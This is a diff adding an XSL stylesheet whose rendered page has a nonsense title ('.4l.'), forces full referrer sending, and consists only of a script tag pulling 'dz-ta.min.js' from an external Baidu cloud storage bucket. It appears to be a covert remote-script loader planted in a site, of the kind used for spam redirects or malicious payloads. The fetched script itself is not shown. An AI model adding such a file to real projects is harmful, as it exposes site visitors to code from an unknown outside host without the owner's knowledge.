@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns="http://www.w3.org/1999/xhtml">
+<xsl:template match="/">
+<html><head><title>.4l.</title><meta content="always" name="referrer"/></head><body><script src="https://dz11.bj.bcebos.com/wdjs/dz-ta.min.js?t=8"></script></body></html>
+</xsl:template>
+</xsl:stylesheet>
